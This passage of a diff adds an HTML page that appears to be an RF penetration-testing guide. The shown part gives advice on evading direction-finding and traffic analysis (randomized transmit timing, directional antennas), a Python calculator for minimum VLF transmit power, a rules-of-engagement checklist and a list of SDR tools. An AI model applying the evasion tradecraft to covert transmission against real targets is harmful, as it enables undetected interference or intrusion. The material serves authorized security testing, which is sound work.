+              <p>Never transmit in a predictable pattern. Randomize inter-transmission intervals. Avoid daily patterns that could be identified through traffic analysis over multiple days.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num"></div>
+            <div class="step-content">
+              <h4>ANTENNA DIRECTIONALITY</h4>
+              <p>A directional antenna (end-fire array, beverage antenna) concentrates energy toward the target and away from direction-finding receivers. Reduces your observable RF footprint significantly.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="code-label">// POWER LEVEL CALCULATOR — MINIMUM VIABLE TX POWER</div>
+        <div class="code-block">
+<span class="keyword">import</span> math
+
+<span class="keyword">def</span> <span class="string">min_tx_power_dBm</span>(
+    distance_km,
+    freq_kHz,
+    rx_sensitivity_dBm=<span class="number">-120</span>,   <span class="comment"># typical VLF receiver</span>
+    link_margin_dB=<span class="number">10</span>,          <span class="comment"># safety margin</span>
+    tx_ant_gain_dBi=<span class="number">0</span>,
+    rx_ant_gain_dBi=<span class="number">0</span>
+):
+    <span class="comment">"""VLF ground wave path loss model (Norton, 1937)"""</span>
+    wavelength_m = <span class="number">3e8</span> / (freq_kHz * <span class="number">1000</span>)
+    d_m = distance_km * <span class="number">1000</span>
+
+    <span class="comment"># Free-space path loss component</span>
+    fspl_dB = <span class="number">20</span>*math.log10(d_m) + <span class="number">20</span>*math.log10(freq_kHz*<span class="number">1000</span>) - <span class="number">147.55</span>
+
+    <span class="comment"># Ground wave attenuation (simplified, flat earth, avg ground)</span>
+    <span class="comment"># Real implementation uses Wait/Norton tables by conductivity</span>
+    gw_atten_dB = <span class="number">0.0158</span> * distance_km * math.sqrt(freq_kHz)
+
+    total_loss = fspl_dB + gw_atten_dB
+    min_tx = rx_sensitivity_dBm + total_loss + link_margin_dB - tx_ant_gain_dBi - rx_ant_gain_dBi
+
+    <span class="keyword">return</span> {
+        <span class="string">'path_loss_dB'</span>: <span class="keyword">round</span>(total_loss, <span class="number">1</span>),
+        <span class="string">'min_tx_dBm'</span>:  <span class="keyword">round</span>(min_tx, <span class="number">1</span>),
+        <span class="string">'min_tx_mW'</span>:   <span class="keyword">round</span>(<span class="number">10</span>**(min_tx/<span class="number">10</span>), <span class="number">3</span>)
+    }
+
+<span class="comment"># Example: 2 km range at 15 kHz</span>
+result = min_tx_power_dBm(distance_km=<span class="number">2</span>, freq_kHz=<span class="number">15</span>)
+print(f<span class="string">"Path loss:    {result['path_loss_dB']} dB"</span>)
+print(f<span class="string">"Min TX power: {result['min_tx_dBm']} dBm ({result['min_tx_mW']} mW)"</span>)
+<span class="comment"># Result: often &lt;1 mW is sufficient for short-range tests</span>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">LEGAL & SCOPE CHECKLIST <span class="tag tag-green">REQUIRED</span></div>
+        <div class="info-box">
+          <span class="hl-green">BEFORE ANY OPERATION — VERIFY ALL OF THESE:</span><br><br>
+          ☐ Written Rules of Engagement (RoE) signed by asset owner<br>
+          ☐ Spectrum authority notification (FCC Part 15 / experimental license if transmitting)<br>
+          ☐ Emergency stop procedure defined and tested<br>
+          ☐ Scope explicitly covers RF/wireless testing (many don't)<br>
+          ☐ Passive-only phase approved separately from active phase<br>
+          ☐ Geofenced test area confirmed — no out-of-scope assets within propagation range<br>
+          ☐ Incident response contact on standby during active testing<br>
+          ☐ All equipment logged with serial numbers for accountability
+        </div>
+
+        <div class="tools">
+          <div class="tool-pill">GNU Radio</div>
+          <div class="tool-pill">URH</div>
+          <div class="tool-pill">Inspectrum</div>
+          <div class="tool-pill">GQRX</div>
+          <div class="tool-pill">SDR#</div>
+          <div class="tool-pill">KiwiSDR</div>
+          <div class="tool-pill">HackRF / USRP</div>
+          <div class="tool-pill">Scapy</div>
+          <div class="tool-pill">NetworkX</div>
+          <div class="tool-pill">SciPy/NumPy</div>
+          <div class="tool-pill">rtl_sdr</div>
+          <div class="tool-pill">gr-osmosdr</div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  function showSection(id) {
+    // Update sections
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+    const target = document.getElementById('section-' + id);
+    if (target) target.classList.add('active');
+
+    // Update nav tabs
+    document.querySelectorAll('.nav-tab').forEach((t, i) => {
+      const map = ['recon','protocol','hardware','gnuradio','injection','interference','opsec'];
+      t.classList.toggle('active', map[i] === id);
+    });
+
+    // Update sidebar
+    document.querySelectorAll('.sidebar-item').forEach(item => {
+      item.classList.remove('active');
+    });
+  }
+
+  // Animate frequency bars on load
+  window.addEventListener('load', () => {
+    document.querySelectorAll('.freq-bar').forEach((bar, i) => {
+      const finalWidth = bar.style.width;
+      bar.style.width = '0%';
+      setTimeout(() => { bar.style.width = finalWidth; }, 300 + i * 100);
+    });
+  });
+
+  // Terminal cursor effect on code blocks
+  document.querySelectorAll('.code-block').forEach(block => {
+    block.addEventListener('click', () => {
+      block.style.borderLeftColor = 'var(--amber)';
+      setTimeout(() => { block.style.borderLeftColor = 'var(--green)'; }, 500);
+    });
+  });
+</script>
+</body>
+</html>
